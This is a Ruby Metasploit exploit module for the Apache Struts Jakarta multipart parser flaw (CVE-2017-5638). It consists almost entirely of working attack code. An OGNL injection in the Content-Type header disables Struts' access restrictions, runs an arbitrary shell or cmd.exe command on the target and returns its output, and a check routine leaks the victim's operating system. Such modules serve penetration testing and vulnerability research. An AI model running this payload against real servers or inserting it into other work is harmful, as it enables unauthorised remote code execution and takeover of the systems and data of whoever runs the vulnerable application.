##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts Jakarta Multipart Parser Remote Code Execution',
      'Description'    => %q{
        This module exploits a remote code execution vunlerability in Apache Struts
        version 2.3.5 - 2.3.31,  and 2.5 - 2.5.10. Remote Code Execution can be performed
        via http Content-Type header.
      },
      'Author'         => [ 'Nixawk' ],
      'References'     => [
        ['CVE', '2017-5638'],
        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-045']
      ],
      'Platform'       => %w{ unix win },
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Apache Struts2 / unix', {} ],
          ['Apache Struts2 / win', {} ]
        ],
      'DisclosureDate' => 'Mar 07 2017',
      'DefaultTarget' => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-showcase/' ]),
          OptString.new('CMD', [true, 'The command to be executed in remote server', 'dir'])
        ]
      )
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def send_http_request(content_type)
    uri = normalize_uri(datastore["TARGETURI"])
    resp = send_request_cgi(
      'uri'     => uri,
      'version' => '1.1',
      'method'  => 'GET',
      'headers' => {
        'Content-Type': content_type
      }
    )

    if resp && resp.code == 404
      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')
    end
    resp
  end

  def http_send_command(cmd)
    content_type = "%{(#_='multipart/form-data')."
    content_type << "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    content_type << "(#_memberAccess?"
    content_type << "(#_memberAccess=#dm):"
    content_type << "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    content_type << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    content_type << "(#ognlUtil.getExcludedPackageNames().clear())."
    content_type << "(#ognlUtil.getExcludedClasses().clear())."
    content_type << "(#context.setMemberAccess(#dm))))."
    content_type << "(#cmd='#{cmd}')."
    content_type << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    content_type << "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    content_type << "(#p=new java.lang.ProcessBuilder(#cmds))."
    content_type << "(#p.redirectErrorStream(true))."
    content_type << "(#process=#p.start())."
    content_type << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    content_type << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    content_type << "(#ros.flush())}"
    send_http_request(content_type)
  end

  def check
    var_a = rand_text_alpha_lower(4)

    content_type = ""
    content_type << %q|%{|
    content_type << %q|(#_='multipart/form-data').|
    content_type << %q|(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).|
    content_type << %q|(#_memberAccess?|
    content_type << %q|(#_memberAccess=#dm):|
    content_type << %q|((#container=#context['com.opensymphony.xwork2.ActionContext.container']).|
    content_type << %q|(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).|
    content_type << %q|(#ognlUtil.getExcludedPackageNames().clear()).|
    content_type << %q|(#ognlUtil.getExcludedClasses().clear()).|
    content_type << %q|(#context.setMemberAccess(#dm)))).|
    content_type << %q|(#os=@java.lang.System@getProperty('os.name')).|
    content_type << %q|(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('|+var_a+%q|', #os))|
    content_type << %q|}|

    begin
      resp = send_http_request(content_type)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end

    if resp && resp.code == 200 && resp.headers[var_a]
      print_good("Victim operating system: #{resp.headers[var_a]}")
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "Exploit not available on this system.")
    end

    resp = http_send_command(datastore['cmd'])
    print_status("Command output: #{resp.body}")
  end
end
